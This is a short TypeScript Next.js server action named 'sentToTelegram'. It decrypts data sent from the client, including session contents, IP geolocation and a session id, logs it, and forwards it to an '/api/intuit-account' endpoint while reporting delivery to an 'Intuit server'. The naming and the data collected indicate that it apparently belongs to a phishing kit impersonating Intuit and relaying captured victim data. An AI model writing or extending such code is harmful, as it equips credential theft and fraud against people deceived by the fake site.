"use server";
import axios from "axios";

import { decryptClientToObject } from "@/utils/server/decryption";
import { sessions, IpLocationData } from "@/store/session";
import { headers } from "next/headers";

// Server action to receive and log data from client side
export async function sentToTelegram(rawData: string): Promise<{
  success: boolean;
  message: string;
  timestamp: string;
}> {
  const data = decryptClientToObject(rawData, process.env.SECRET_KEY!) as {
    data: sessions;
    ipLocationData: IpLocationData;
    sessionId: string;
  };
  try {
    // Log the received data on the server side
    console.log("=== SERVER ACTION: Data received from client ===");
    console.log("Timestamp:", new Date().toISOString());
    console.log("Data type:", typeof data);
    console.log("Data content:", data);

    // If it's an object, log it in a formatted way
    if (typeof data === "object" && data !== null) {
      console.log("Formatted data:", JSON.stringify(data, null, 2));
    }

    console.log("=== END SERVER LOG ===");

    const headersList = await headers();
    const host = headersList.get("host");
    const protocol = host?.includes("localhost") ? "http" : "https";

    const { data: axiosResponse } = await axios.post(
      `${protocol}://${host}/api/intuit-account`,
      {
        data: data?.data,
        ipLocationData: data.ipLocationData,
        sessionId: data.sessionId,
      }
    );
    console.log(axiosResponse);

    return {
      success: true,
      message: "Data successfully received by Intuit server",
      timestamp: new Date().toISOString(),
    };
  } catch (error) {
    console.error("Error in server action:", error);
    return {
      success: false,
      message: "Failed send data to Intuit server",
      timestamp: new Date().toISOString(),
    };
  }
}
